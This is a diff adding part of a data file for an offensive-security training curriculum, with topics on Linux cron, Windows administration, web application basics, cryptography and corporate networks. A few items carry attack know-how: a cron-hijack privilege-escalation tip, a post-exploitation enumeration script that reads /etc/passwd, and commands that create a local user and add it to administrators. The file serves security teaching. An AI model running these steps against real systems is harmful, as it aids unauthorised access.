+          "Privesc angle: if a root cron job calls a script writable by your user, you can hijack it",
+        ],
+        terminalCommands: ["crontab -e", "crontab -l", "cat /etc/crontab", "ls -la /etc/cron.d/"],
+      },
+      {
+        id: "m3-linux-14",
+        moduleId: "m3-linux",
+        number: 38,
+        title: "OverTheWire: Bandit Levels 0-10",
+        type: "lab",
+        week: 3,
+        description:
+          "A wargame that teaches Linux/SSH fundamentals level by level — each level is an SSH login that hides the password for the next level somewhere on the filesystem.",
+        keyPoints: [
+          "Level 0: connect via SSH with the credentials given on the Bandit site",
+          "Each level requires applying a new command/concept (find, cat hidden files, permissions, compression) to locate the next password",
+          "Submit a screenshot of the Level 10 flag/password as proof of completion",
+        ],
+        terminalCommands: ["ssh bandit0@bandit.labs.overthewire.org -p 2220"],
+      },
+      {
+        id: "m3-linux-15",
+        moduleId: "m3-linux",
+        number: 39,
+        title: "Bash Script: Enumerate users & running processes",
+        type: "lab",
+        week: 3,
+        description:
+          "Write a Bash script that automatically enumerates local users, running processes, and listening ports — a mini version of the enumeration scripts used in real post-exploitation.",
+        keyPoints: [
+          "Read /etc/passwd to list local users and their shells",
+          "Use ps aux to capture running processes",
+          "Use ss -tulpn (or netstat) to capture listening ports",
+          "Write all output to a timestamped report file with tee",
+        ],
+        terminalCommands: [
+          "#!/bin/bash",
+          'echo "== Users ==" ; cut -d: -f1 /etc/passwd',
+          'echo "== Processes ==" ; ps aux',
+          'echo "== Listening Ports ==" ; ss -tulpn',
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M3b: OS Basics — Windows
+  // ============================================================
+  {
+    id: "m3-windows",
+    name: "M3: OS Basics - Windows",
+    shortName: "Windows Basics",
+    month: 1,
+    weeks: [4],
+    description:
+      "Most corporate environments you'll test run Windows and Active Directory. This module covers the architecture, permission model, and command-line tools (CMD/PowerShell) needed to operate confidently on a Windows box — critical groundwork for AD attacks and Windows privesc later.",
+    estimatedHours: 20,
+    outcomes: [
+      "Explain User Mode vs Kernel Mode and why it matters for stability/security",
+      "Manage files, permissions (ACL/icacls), users, and groups from CMD/PowerShell",
+      "Manage Windows processes and services from the command line",
+      "Configure and query Windows Defender and Windows Firewall via CLI",
+      "Investigate a Windows Event Log for indicators of compromise",
+    ],
+    resources: [
+      { title: "TryHackMe Windows Fundamentals", url: "https://tryhackme.com", type: "platform" },
+      { title: "Microsoft Docs", url: "https://learn.microsoft.com", type: "link" },
+      { title: "SS64.com CMD/PowerShell reference", url: "https://ss64.com", type: "link" },
+    ],
+    topics: [
+      {
+        id: "m3-windows-1",
+        moduleId: "m3-windows",
+        number: 40,
+        title: "Windows Versions & Architecture (User Mode vs Kernel Mode)",
+        type: "theory",
+        week: 4,
+        description:
+          "The CPU has two privilege rings relevant here — User Mode (Ring 3) and Kernel Mode (Ring 0) — think User Mode as the building lobby, Kernel Mode as the control room.",
+        keyPoints: [
+          "User Mode: restricted, apps use the Windows API/system calls to reach Kernel Mode, own virtual address space per process",
+          "Kernel Mode: direct hardware/memory access, runs Executive subsystems + device drivers; a kernel crash = BSOD",
+          "Windows 10/11 Pro adds BitLocker, RDP host, Group Policy, Hyper-V; Enterprise adds Defender ATP, AppLocker, Credential Guard",
+          "Windows Server editions add AD DS, DNS/DHCP, IIS, and Domain Controller roles — not meant for end-user desktops",
+        ],
+      },
+      {
+        id: "m3-windows-2",
+        moduleId: "m3-windows",
+        number: 41,
+        title: "File Navigation & Management (Explorer, CMD: cd, dir, copy, del, icacls)",
+        type: "theory",
+        week: 4,
+        description:
+          "The CMD equivalents of Linux's cd/ls/cp/rm, plus icacls for viewing/editing file permissions from the command line.",
+        keyPoints: [
+          "dir /a shows hidden files; rmdir /s /q removes a folder and its contents quietly",
+          "icacls shows/edits ACL permissions on a file or folder directly from CMD",
+        ],
+        terminalCommands: [
+          "cd C:\\Users\\Admin\\Documents",
+          "dir /a",
+          "copy file.txt D:\\Backup\\file.txt",
+          "move data.csv C:\\Archive\\data.csv",
+          "del old_report.txt",
+          "mkdir NewFolder",
+          "rmdir /s /q UnusedFolder",
+          "icacls filename.txt",
+          "icacls filename.txt /grant UserName:F",
+        ],
+      },
+      {
+        id: "m3-windows-3",
+        moduleId: "m3-windows",
+        number: 42,
+        title: "NTFS File System & Permissions",
+        type: "theory",
+        week: 4,
+        description:
+          "NTFS is the modern Windows filesystem, supporting per-file/folder ACLs, encryption (EFS), compression, and journaling for crash recovery.",
+        keyPoints: [
+          "NTFS permissions stack with share permissions — the most restrictive of the two wins",
+          "Supports Alternate Data Streams (ADS) — a technique sometimes abused to hide data/malware",
+          "Journaling logs changes before committing them, protecting against corruption on crash",
+        ],
+      },
+      {
+        id: "m3-windows-4",
+        moduleId: "m3-windows",
+        number: 43,
+        title: "Windows Registry (regedit, structure, common keys)",
+        type: "theory",
+        week: 4,
+        description:
+          "A hierarchical database storing low-level OS and application configuration — a favourite target for both legitimate admin and malware persistence.",
+        keyPoints: [
+          "Root hives: HKEY_LOCAL_MACHINE (system-wide), HKEY_CURRENT_USER (per-user), HKEY_CLASSES_ROOT, HKEY_USERS",
+          "HKLM\\...\\Run and HKCU\\...\\Run keys auto-launch programs at login — a common persistence/malware mechanism",
+          "regedit provides a GUI; reg query/reg add work from CMD/scripts",
+        ],
+        terminalCommands: [
+          "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
+        ],
+      },
+      {
+        id: "m3-windows-5",
+        moduleId: "m3-windows",
+        number: 44,
+        title: "User & Group Management (net user, whoami, UAC, Group Policy)",
+        type: "theory",
+        week: 4,
+        description:
+          "Local and domain user/group administration from the command line, plus User Account Control (UAC) as a privilege-escalation guard rail.",
+        keyPoints: [
+          "UAC prompts for consent/credentials before running an action with admin rights",
+          "Group Policy (GPO) pushes centralized configuration/security settings across domain-joined machines",
+        ],
+        terminalCommands: [
+          "net user",
+          "net user testuser Pass@123 /add",
+          "whoami",
+          "wmic useraccount get name,sid,status",
+          "net localgroup administrators",
+          "net localgroup administrators testuser /add",
+        ],
+      },
+      {
+        id: "m3-windows-6",
+        moduleId: "m3-windows",
+        number: 45,
+        title: "Windows ACL (Access Control List) & icacls",
+        type: "theory",
+        week: 4,
+        description:
+          "ACLs manage permissions on files, folders, registry keys, and network resources — via DACLs (who can do what) and SACLs (what gets audited).",
+        keyPoints: [
+          "DACL (Discretionary ACL): user/group permissions; SACL (System ACL): auditing configuration",
+          "ACEs (Access Control Entries) are the individual permission rules that make up an ACL",
+          "SIDs (Security Identifiers) uniquely identify users/groups, independent of display name",
+          "GUI path: right-click file/folder → Properties → Security tab",
+        ],
+        terminalCommands: [
+          'icacls "C:\\example\\file.txt"',
+          'icacls "C:\\example\\file.txt" /grant JohnDoe:R',
+          'icacls "C:\\example\\file.txt" /remove JohnDoe',
+          'icacls "C:\\example" /save "C:\\acl_backup.txt"',
+          "$acl = Get-Acl \"C:\\example\\file.txt\"",
+          "Set-Acl \"C:\\example\\file.txt\" $acl",
+        ],
+      },
+      {
+        id: "m3-windows-7",
+        moduleId: "m3-windows",
+        number: 46,
+        title: "Processes & Services (tasklist, taskkill, sc, services.msc)",
+        type: "theory",
+        week: 4,
+        description:
+          "The Windows equivalents of ps/kill/systemctl — tasklist/taskkill for processes, sc/services.msc for services.",
+        keyPoints: [
+          "taskkill /F /T /IM forces termination of a process and its child-process tree",
+          "sc query shows a service's current state (e.g. RUNNING/STOPPED)",
+        ],
+        terminalCommands: [
+          "tasklist",
+          'tasklist | findstr "notepad"',
+          "taskkill /F /T /IM notepad.exe",
+          "Get-Process | Sort-Object -Property CPU -Descending",
+          "sc query wuauserv",
+          "Get-Service -Name \"wuauserv\"",
+          "Restart-Service -Name \"wuauserv\"",
+        ],
+      },
+      {
+        id: "m3-windows-8",
+        moduleId: "m3-windows",
+        number: 47,
+        title: "PowerShell Essentials (Get-Help, Get-Command, Get-Process, Invoke-Expression)",
+        type: "theory",
+        week: 4,
+        description:
+          "PowerShell is an object-oriented shell built on .NET — far more powerful for scripting/automation than legacy CMD, and heavily used offensively (and defensively) in Windows environments.",
+        keyPoints: [
+          "Get-Command finds cmdlets; Get-Help shows usage and examples for any cmdlet",
+          "Execution Policy controls whether scripts can run at all (RemoteSigned is a common safe default)",
+          "Invoke-Expression executes a string as PowerShell code — powerful, and a common living-off-the-land technique",
+        ],
+        terminalCommands: [
+          "Get-Command *service*",
+          "Get-Help Get-Service -Examples",
+          "Get-ExecutionPolicy",
+          "Set-ExecutionPolicy RemoteSigned",
+          'Invoke-Expression "Get-Date"',
+        ],
+      },
+      {
+        id: "m3-windows-9",
+        moduleId: "m3-windows",
+        number: 48,
+        title: "CMD Essentials (ipconfig, netstat, nslookup, systeminfo, hostname, wmic)",
+        type: "theory",
+        week: 4,
+        description:
+          "Classic CMD tools for quick system and network reconnaissance on a Windows host.",
+        keyPoints: [
+          "systeminfo dumps a full inventory of OS, patches, and hardware in one command",
+          "wmic queries WMI directly for hardware/software details from the command line",
+        ],
+        terminalCommands: [
+          "ipconfig /all",
+          "systeminfo",
+          "hostname",
+          "wmic product get name,version",
+          "wmic cpu get name,maxclockspeed",
+        ],
+      },
+      {
+        id: "m3-windows-10",
+        moduleId: "m3-windows",
+        number: 49,
+        title: "Windows Defender & Windows Firewall",
+        type: "theory",
+        week: 4,
+        description:
+          "Windows' built-in AV/EDR (Defender) and host firewall — you'll need to query and sometimes tune both when operating on a Windows target or lab VM.",
+        keyPoints: [
+          "Defender: real-time protection against viruses/ransomware/spyware, integrates with Intune/SCCM in enterprise",
+          "Firewall: profile-based (Domain/Private/Public) inbound/outbound rule engine",
+        ],
+        terminalCommands: [
+          "Get-MpComputerStatus",
+          "Update-MpSignature",
+          "MpCmdRun.exe -Scan -ScanType 1",
+          "netsh advfirewall show allprofiles",
+          'netsh advfirewall firewall add rule name="Allow HTTP" protocol=TCP dir=in localport=80 action=allow',
+          "Get-NetFirewallRule",
+        ],
+      },
+      {
+        id: "m3-windows-11",
+        moduleId: "m3-windows",
+        number: 50,
+        title: "Event Viewer & Windows Log Analysis",
+        type: "theory",
+        week: 4,
+        description:
+          "Windows logs almost everything of security interest into Event Viewer — filtering by Event ID is the fastest way to find the signal in thousands of log lines.",
+        keyPoints: [
+          "Event ID 4624/4625: successful/failed logon — core for brute-force detection",
+          "Event ID 4657: registry key modification (auditing must be enabled)",
+          "Event ID 1074: system shutdown/restart initiated",
+          "Saved .evtx log files can be loaded into Event Viewer for offline analysis",
+        ],
+      },
+      {
+        id: "m3-windows-12",
+        moduleId: "m3-windows",
+        number: 51,
+        title: "BitLocker & Disk Encryption",
+        type: "theory",
+        week: 4,
+        description:
+          "BitLocker is Windows' built-in full-disk encryption feature (Pro/Enterprise), protecting data at rest if a device is lost or stolen.",
+        keyPoints: [
+          "Uses the TPM (Trusted Platform Module) to seal the encryption key to the specific hardware",
+          "Without the recovery key, an encrypted drive's contents are unreadable even if physically removed",
+        ],
+        terminalCommands: ["manage-bde -status", "manage-bde -on C:"],
+      },
+      {
+        id: "m3-windows-13",
+        moduleId: "m3-windows",
+        number: 52,
+        title: "Lab: PowerShell script to enumerate processes & users",
+        type: "lab",
+        week: 4,
+        description:
+          "Write a PowerShell script that lists all running processes, local users, and scheduled tasks — the Windows counterpart to the M3-Linux bash enumeration lab.",
+        keyPoints: [
+          "Get-Process for running processes",
+          "Get-LocalUser (or net user) for local accounts",
+          "Get-ScheduledTask for persistence/automation review",
+        ],
+        terminalCommands: [
+          "Get-Process | Out-File C:\\temp\\Processes.txt",
+          "Get-LocalUser",
+          "Get-ScheduledTask | Select-Object TaskName,State",
+        ],
+      },
+      {
+        id: "m3-windows-14",
+        moduleId: "m3-windows",
+        number: 53,
+        title: "TryHackMe: Windows Fundamentals Parts 1, 2, and 3",
+        type: "lab",
+        week: 4,
+        description:
+          "A guided TryHackMe room series covering Windows navigation, system settings, and administrative tools end-to-end.",
+        keyPoints: [
+          "Part 1: OS structure, editions, and basic navigation",
+          "Part 2: System configuration, Control Panel, settings",
+          "Part 3: User management, UAC, and administrative tools",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M4: Application Basics
+  // ============================================================
+  {
+    id: "m4",
+    name: "M4: Application Basics",
+    shortName: "App Basics",
+    month: 2,
+    weeks: [5],
+    description:
+      "How modern web/mobile applications are actually built — frontend, backend, APIs, databases, sessions, and auth. Every web attack in M9/M10 is exploiting a gap in one of these building blocks, so understanding how they're supposed to work is the prerequisite for understanding how they break.",
+    estimatedHours: 10,
+    outcomes: [
+      "Differentiate web, mobile, and thick-client applications and their attack surfaces",
+      "Describe the SDLC and where security testing fits into it",
+      "Explain how sessions/cookies maintain login state, and the flags that secure them",
+      "Compare authentication methods (password, MFA, OAuth2) and authorization models (RBAC/ABAC)",
+    ],
+    resources: [
+      { title: "OWASP Session Management Cheat Sheet", url: "https://cheatsheetseries.owasp.org", type: "link" },
+      { title: "PortSwigger Web Academy Intro", url: "https://portswigger.net/web-security", type: "platform" },
+    ],
+    topics: [
+      {
+        id: "m4-1",
+        moduleId: "m4",
+        number: 54,
+        title: "Web vs Mobile vs Thick Client Applications",
+        type: "theory",
+        week: 5,
+        description:
+          "Each application category has a different attack surface: web apps run mostly server-side logic behind HTTP, mobile apps ship logic to the device, thick clients run natively with direct OS/API access.",
+        keyPoints: [
+          "Web apps: browser-rendered, server does most of the work, tested via HTTP proxy (Burp)",
+          "Mobile apps: logic partly on-device (APK/IPA), tested via static analysis + intercepting the app's API traffic",
+          "Thick clients: full native desktop apps, often talk directly to a database or custom protocol, tested via binary/traffic analysis",
+        ],
+      },
+      {
+        id: "m4-2",
+        moduleId: "m4",
+        number: 55,
+        title: "Software Development Life Cycle (SDLC)",
+        type: "theory",
+        week: 5,
+        description:
+          "The SDLC is the structured process software goes through from idea to retirement — security testing (SAST/DAST/pentesting) should be embedded at multiple stages, not bolted on at the end.",
+        keyPoints: [
+          "Phases: Requirements → Design → Development → Testing → Deployment → Maintenance",
+          "'Shift-left' security means testing earlier (code review, SAST) rather than only at the end (pentest before launch)",
+          "DevSecOps integrates automated security scanning directly into the CI/CD pipeline",
+        ],
+      },
+      {
+        id: "m4-3",
+        moduleId: "m4",
+        number: 56,
+        title: "Frontend (HTML, CSS, JavaScript, React, Angular)",
+        type: "theory",
+        week: 5,
+        description:
+          "The frontend is everything that runs in the user's browser — and because it's fully visible/modifiable by the user, it must never be the only line of defence (client-side validation is a UX feature, not a security control).",
+        keyPoints: [
+          "HTML structures content, CSS styles it, JavaScript adds interactivity/logic",
+          "React/Angular/Vue are frameworks for building complex, component-based UIs (Single Page Applications)",
+          "Any validation or 'hidden' logic written in JS can be read and bypassed by an attacker using DevTools",
+        ],
+      },
+      {
+        id: "m4-4",
+        moduleId: "m4",
+        number: 57,
+        title: "Backend (Node.js, Python/Django/Flask, Java, PHP)",
+        type: "theory",
+        week: 5,
+        description:
+          "The backend runs server-side, handling business logic, authentication, and database access — this is where the real security enforcement must happen.",
+        keyPoints: [
+          "Node.js (JavaScript), Python (Django/Flask), Java (Spring), PHP — different languages, same responsibilities",
+          "Backend frameworks often include built-in protections (CSRF tokens, ORM query parameterisation) that must not be disabled",
+        ],
+      },
+      {
+        id: "m4-5",
+        moduleId: "m4",
+        number: 58,
+        title: "APIs - REST vs SOAP, HTTP Methods (GET/POST/PUT/DELETE), Status Codes",
+        type: "theory",
+        week: 5,
+        description:
+          "APIs are how frontend, mobile, and third parties talk to the backend — REST (lightweight, JSON, stateless) has largely replaced the older, more rigid SOAP (XML-based) standard.",
+        keyPoints: [
+          "GET (read), POST (create), PUT (replace), PATCH (partial update), DELETE (remove)",
+          "2xx = success, 3xx = redirect, 4xx = client error (401 unauthenticated, 403 forbidden, 404 not found), 5xx = server error",
+          "REST APIs are the most common target for the API-security topics covered in M10",
+        ],
+        terminalCommands: ["curl -X GET https://api.example.com/users/1", "curl -I https://example.com"],
+      },
+      {
+        id: "m4-6",
+        moduleId: "m4",
+        number: 59,
+        title: "Databases - SQL vs NoSQL (MySQL, PostgreSQL, MongoDB)",
+        type: "theory",
+        week: 5,
+        description:
+          "SQL databases (MySQL, PostgreSQL) store structured data in tables with a fixed schema; NoSQL databases (MongoDB) store flexible, often JSON-like documents.",
+        keyPoints: [
+          "SQL injection (M9) targets SQL databases via unsanitised query input",
+          "NoSQL injection targets MongoDB-style query operators (e.g. $ne, $gt) instead of SQL syntax",
+          "ORMs (Object-Relational Mappers) reduce (but don't eliminate) injection risk via parameterised queries",
+        ],
+      },
+      {
+        id: "m4-7",
+        moduleId: "m4",
+        number: 60,
+        title: "Sessions & Cookies (HttpOnly, Secure, SameSite attributes)",
+        type: "theory",
+        week: 5,
+        description:
+          "Cookies/session tokens maintain login state across otherwise-stateless HTTP requests — missing security flags on that cookie is how session hijacking becomes possible.",
+        keyPoints: [
+          "Session hijacking: attacker steals/predicts a session ID to impersonate a user without credentials",
+          "HttpOnly: blocks JavaScript from reading the cookie (mitigates theft via XSS)",
+          "Secure: cookie only ever sent over HTTPS",
+          "SameSite=Strict: blocks the cookie being sent on cross-site requests (mitigates CSRF)",
+        ],
+        terminalCommands: ["Set-Cookie: sessionID=abc123xyz456; HttpOnly; Secure; SameSite=Strict;"],
+      },
+      {
+        id: "m4-8",
+        moduleId: "m4",
+        number: 61,
+        title: "Authentication Methods (Password, MFA, OAuth 2.0, Form-based)",
+        type: "theory",
+        week: 5,
+        description:
+          "Authentication answers 'are you who you claim to be?' — modern systems combine multiple factors and increasingly delegate identity via OAuth2 rather than handling passwords directly.",
+        keyPoints: [
+          "Three factors: Knowledge (password/PIN), Possession (token/app), Inherence (biometrics)",
+          "MFA combines 2+ factors — e.g. password + time-sensitive mobile code",
+          "OAuth2 uses access tokens instead of a shared username/password — misconfigured redirect URIs are a common vuln class",
+          "Adaptive/risk-based authentication adds extra checks for unusual login context (new device/location)",
+        ],
+      },
+      {
+        id: "m4-9",
+        moduleId: "m4",
+        number: 62,
+        title: "Authorization - RBAC & ABAC",
+        type: "theory",
+        week: 5,
+        description:
+          "Authorization answers 'what are you allowed to do?' — a completely separate question from authentication, and the one Broken Access Control (M9) exploits when it's implemented incorrectly.",
+        keyPoints: [
+          "RBAC (Role-Based): permissions tied to a role, e.g. 'Manager' can approve expense reports",
+          "ABAC (Attribute-Based): dynamic decisions based on attributes, e.g. age-verification for a purchase",
+          "Workflow: authenticate → identify roles/attributes → compare against policy → grant/deny → log",
+          "Best practice: principle of least privilege + regular access audits",
+        ],
+      },
+      {
+        id: "m4-10",
+        moduleId: "m4",
+        number: 63,
+        title: "Lab: Inspect & manipulate session cookies with DevTools",
+        type: "lab",
+        week: 5,
+        description:
+          "Use browser DevTools to view, understand, and tamper with a site's session cookies — the manual-testing precursor to the session-hijacking/CSRF attacks covered later.",
+        keyPoints: [
+          "Open DevTools (F12) → Application/Storage tab → Cookies to view all flags set on a cookie",
+          "Check for missing HttpOnly/Secure/SameSite flags on any session cookie",
+          "Try editing a cookie value directly in DevTools and reloading to observe the app's response",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M5: Cryptography Basics
+  // ============================================================
+  {
+    id: "m5",
+    name: "M5: Cryptography Basics",
+    shortName: "Cryptography",
+    month: 2,
+    weeks: [5],
+    description:
+      "Cryptography is how confidentiality and integrity are actually enforced technically — and 'Cryptographic Failures' is its own OWASP Top 10 category (A02) because encoding, encryption, and hashing get confused for each other constantly. This module makes the distinction permanent.",
+    estimatedHours: 10,
+    outcomes: [
+      "Clearly distinguish encoding, encryption, and hashing and when each is (mis)used",
+      "Explain symmetric vs asymmetric cryptography and name common algorithms of each",
+      "Identify weak hashing (MD5/SHA1) vs strong password hashing (bcrypt/Argon2)",
+      "Describe how digital signatures and PKI/certificates establish trust",
+      "Generate and use an RSA keypair with OpenSSL",
+    ],
+    resources: [
+      { title: "CryptoHack.org", url: "https://cryptohack.org", type: "platform" },
+      { title: "OWASP Cryptographic Failures", url: "https://owasp.org/Top10/A02_2021-Cryptographic_Failures/", type: "link" },
+    ],
+    topics: [
+      {
+        id: "m5-1",
+        moduleId: "m5",
+        number: 64,
+        title: "Encoding vs Encryption vs Hashing - Key Differences & When Used",
+        type: "theory",
+        week: 5,
+        description:
+          "The single most confused trio in security: encoding is reversible with no key, encryption is reversible only with a key, and hashing is not reversible at all.",
+        keyPoints: [
+          "Encoding: reformats data, no security value on its own — Base64('Hello') = SGVsbG8=",
+          "Encryption: scrambles data with a secret key, reversible only if you have that key",
+          "Hashing: one-way, fixed-length output — SHA-256('Hello') always produces the same fixed string, and changing one letter changes the whole hash",
+          "OWASP A02 'Cryptographic Failures' is largely caused by treating one of these as if it were another",
+        ],
+      },
+      {
+        id: "m5-2",
+        moduleId: "m5",
+        number: 65,
+        title: "Common Encoding Schemes (Base64, URL encoding, HTML encoding)",
+        type: "theory",
+        week: 5,
+        description:
+          "Encoding schemes exist to safely represent data in a different format (e.g. binary-safe text, or characters safe for a URL) — never to hide or protect it.",
+        keyPoints: [
+          "Base64: encodes binary data as ASCII text, commonly seen in Basic Auth headers and Burp's Decoder tool",
+          "URL encoding: escapes special characters for safe inclusion in a URL — space becomes %20",
+          "HTML encoding: escapes characters with HTML meaning (< becomes &lt;) — the core defence against XSS",
+        ],
+      },
+      {
+        id: "m5-3",
+        moduleId: "m5",
+        number: 66,
+        title: "Symmetric Cryptography (AES, DES, 3DES, key exchange problem)",
+        type: "theory",
+        week: 5,
+        description:
+          "Symmetric crypto uses the same key to encrypt and decrypt — fast, but both parties need the same secret key, which creates the 'key exchange problem' solved by asymmetric crypto.",
+        keyPoints: [
+          "AES (Advanced Encryption Standard): the modern standard, used in Wi-Fi (WPA2/3), file storage, corporate comms",
+          "DES/3DES: older, now considered weak/deprecated (DES has a trivially small 56-bit key)",
+          "Use cases: encrypting data at rest, VPN tunnels, disk encryption (BitLocker uses AES)",
+        ],
+        terminalCommands: [
+          "from cryptography.fernet import Fernet",
+          "key = Fernet.generate_key()",
+          "Fernet(key).encrypt(b'secret message')",
+        ],
+      },
+      {
+        id: "m5-4",
+        moduleId: "m5",
+        number: 67,
+        title: "Asymmetric Cryptography (RSA, ECC, public/private key pair)",
+        type: "theory",
+        week: 5,
+        description:
+          "Asymmetric crypto uses a mathematically-linked key pair — a public key anyone can use to encrypt, and a private key only the owner holds to decrypt — solving the symmetric key-exchange problem.",
+        keyPoints: [
+          "RSA: based on the difficulty of factoring large primes; widely used for TLS and digital signatures",
+          "ECC (Elliptic Curve Cryptography): smaller keys than RSA for equivalent security, used in modern TLS and cryptocurrency",
+          "Use cases: HTTPS/TLS handshakes, secure email (PGP), digital signatures, SSH key auth",
+        ],
+      },
+      {
+        id: "m5-5",
+        moduleId: "m5",
+        number: 68,
+        title: "Hashing Algorithms (MD5, SHA-1, SHA-256, bcrypt, Argon2)",
+        type: "theory",
+        week: 5,
+        description:
+          "Not all hashes are equal for password storage — general-purpose hashes (MD5/SHA1/SHA256) are fast, which is exactly wrong for passwords; bcrypt/Argon2 are deliberately slow and salted.",
+        keyPoints: [
+          "MD5, SHA-1: broken/crackable, and offer no built-in salting — never use for password storage",
+          "SHA-256: still cryptographically fine for integrity checks (file hashes) but too fast for password storage",
+          "bcrypt, Argon2: purpose-built for passwords — deliberately slow, with automatic per-hash salting",
+        ],
+        terminalCommands: [
+          "import bcrypt",
+          "hashed = bcrypt.hashpw(b'myPassword', bcrypt.gensalt())",
+          "bcrypt.checkpw(b'myPassword', hashed)",
+        ],
+      },
+      {
+        id: "m5-6",
+        moduleId: "m5",
+        number: 69,
+        title: "Digital Signatures (how they work, signing & verification)",
+        type: "theory",
+        week: 5,
+        description:
+          "A digital signature proves both integrity and authenticity — the sender signs data with their private key, and anyone can verify it using the sender's public key.",
+        keyPoints: [
+          "Signing: hash the message, then encrypt that hash with the signer's private key",
+          "Verification: decrypt the signature with the sender's public key and compare to a fresh hash of the message",
+          "Used in code-signing (verifying software hasn't been tampered with) and TLS certificates",
+        ],
+      },
+      {
+        id: "m5-7",
+        moduleId: "m5",
+        number: 70,
+        title: "Certificates & PKI (X.509, CA, chain of trust, TLS handshake)",
+        type: "theory",
+        week: 5,
+        description:
+          "PKI (Public Key Infrastructure) is the system of Certificate Authorities (CAs) that lets your browser trust that a public key really belongs to the site claiming it.",
+        keyPoints: [
+          "X.509 certificates bind a public key to an identity (domain name), signed by a trusted CA",
+          "Chain of trust: your OS/browser trusts a small set of Root CAs, which sign Intermediate CAs, which sign site certificates",
+          "TLS handshake (simplified): client/server agree on cipher suite → server presents certificate → key exchange → encrypted session begins",
+        ],
+      },
+      {
+        id: "m5-8",
+        moduleId: "m5",
+        number: 71,
+        title: "Key Exchange (Diffie-Hellman, ECDH)",
+        type: "theory",
+        week: 5,
+        description:
+          "Key exchange protocols let two parties agree on a shared secret over an untrusted channel without ever transmitting the secret itself.",
+        keyPoints: [
+          "Diffie-Hellman: both parties combine their own private value with a shared public value to independently derive the same secret",
+          "ECDH: the elliptic-curve variant of Diffie-Hellman, used throughout modern TLS for forward secrecy",
+        ],
+      },
+      {
+        id: "m5-9",
+        moduleId: "m5",
+        number: 72,
+        title: "Lab: Manually encode/decode strings in Base64 & URL encoding",
+        type: "lab",
+        week: 5,
+        description:
+          "Practice converting strings between plaintext, Base64, and URL encoding by hand before relying on tooling — this builds the intuition needed to instantly recognise encoded data during recon/exploitation.",
+        keyPoints: [
+          "Encode 5 different strings to Base64, then decode them back without a tool first, then verify with CyberChef",
+          "URL-encode a string containing special characters (&, =, /, space) and confirm each substitution",
+          "Recognise the telltale '=' padding characters and character set of Base64 output",
+        ],
+        terminalCommands: [
+          "echo -n 'Hello World' | base64",
+          "echo 'SGVsbG8gV29ybGQ=' | base64 -d",
+        ],
+      },
+      {
+        id: "m5-10",
+        moduleId: "m5",
+        number: 73,
+        title: "Lab: Generate RSA keypair with OpenSSL, sign & verify a file",
+        type: "lab",
+        week: 5,
+        description:
+          "Hands-on OpenSSL lab — generate a real RSA keypair, then use it to sign and verify a file's digital signature.",
+        keyPoints: [
+          "Generate a private key first, then derive the public key from it",
+          "Sign a file's hash with the private key; verify the signature using only the public key",
+          "Confirm that tampering with the file after signing causes verification to fail",
+        ],
+        terminalCommands: [
+          "openssl genrsa -out private.pem 2048",
+          "openssl rsa -in private.pem -pubout -out public.pem",
+          "openssl dgst -sha256 -sign private.pem -out file.sig file.txt",
+          "openssl dgst -sha256 -verify public.pem -signature file.sig file.txt",
+        ],
+      },
+    ],
+  },
+
+  // ============================================================
+  // M6: Corporate Networks
+  // ============================================================
+  {
+    id: "m6",
+    name: "M6: Corporate Networks",
+    shortName: "Corporate Networks",
+    month: 2,
+    weeks: [6],
+    description:
+      "Real engagements target corporate environments, not standalone machines. This module covers how organisations actually segment, defend, and manage their internal networks — DMZ, VLANs, Active Directory, Zero Trust — the terrain every later recon and exploitation module assumes you understand.",
+    estimatedHours: 12,
+    outcomes: [
+      "Explain corporate network architecture and common topologies",
+      "Describe DMZ design and why public-facing services are isolated there",
+      "Understand VLANs, segmentation, and their security benefits",
+      "Explain Active Directory's role and Zero Trust principles",
+      "Compare EDR, IDS/IPS, WAF, and NGFW as layered defences",
+    ],
+    resources: [
+      { title: "TryHackMe AD Basics", url: "https://tryhackme.com", type: "platform" },
+      { title: "draw.io", url: "https://app.diagrams.net", type: "tool" },
+      { title: "BloodHound", url: "https://bloodhound.readthedocs.io", type: "tool" },
+    ],
+    topics: [
+      {
+        id: "m6-1",
+        moduleId: "m6",
+        number: 74,
+        title: "Corporate Network Architecture Overview",
+        type: "theory",
+        week: 6,
+        description:
+          "Think of a corporate network like an office building: rooms are departments, corridors are the LAN, the internet is the outside world, and firewalls are the security guards controlling entry.",
+        keyPoints: [
+          "Benefits: shared resources (drives/printers), centralised storage/backup, controlled/restricted access (e.g. payroll systems), remote access via VPN",
+          "Corporate network security = the practices, policies, and technologies safeguarding the network from unauthorised access and breaches",
+        ],
+      },
+      {
+        id: "m6-2",
+        moduleId: "m6",
+        number: 75,
+        title: "Network Topologies in Enterprise (Segmented, Flat, Hub-and-Spoke)",
+        type: "theory",
+        week: 6,
+        description:
+          "How a network's physical/logical layout is designed shapes both its performance and its blast radius when a single host is compromised.",
+        keyPoints: [
+          "Flat network: everything on one broadcast domain — simplest, but a single compromised host can reach everything",
+          "Segmented network: split into zones/VLANs, limiting lateral movement if one segment is breached",
+          "Hub-and-spoke: a central site connects to multiple branch sites, common in multi-office organisations",
+        ],
+      },
+      {
+        id: "m6-3",
+        moduleId: "m6",
+        number: 76,
+        title: "VLANs (Virtual LANs) & Network Segmentation",
+        type: "theory",
+        week: 6,
+        description:
+          "A VLAN is logical segmentation into isolated broadcast domains — like adding invisible walls between rooms in the same building.",
+        keyPoints: [
+          "Why: security segmentation, reduced broadcast traffic, logical grouping (HR/Finance/IT), better access control",
+          "Switch ports are assigned VLAN IDs; a Layer-3 device is needed for inter-VLAN routing",
+          "802.1Q is the standard tagging protocol used on trunk links carrying multiple VLANs",
+          "Example: VLAN 10=HR, VLAN 20=IT, VLAN 30=Finance — isolated from each other unless explicitly routed",
+        ],
+      },
+      {
+        id: "m6-4",
+        moduleId: "m6",
+        number: 77,
+        title: "DMZ (Demilitarised Zone) - Purpose & Design",
+        type: "theory",
+        week: 6,
+        description:
+          "A DMZ is an isolated subnet sitting between the trusted internal LAN and the untrusted internet, hosting only the services that must be reachable from outside.",
+        keyPoints: [
+          "Typical 3-legged firewall setup: Internet interface, Internal LAN interface, DMZ interface",
+          "Traffic rules: Internet→DMZ allowed; DMZ→Internal strictly restricted; Internal→DMZ allowed (admin); Internet→Internal blocked",
+          "Common DMZ services: web servers, mail servers (SMTP), DNS servers, VPN gateways, reverse proxies",
+        ],
+      },
+      {
+        id: "m6-5",
+        moduleId: "m6",
+        number: 78,
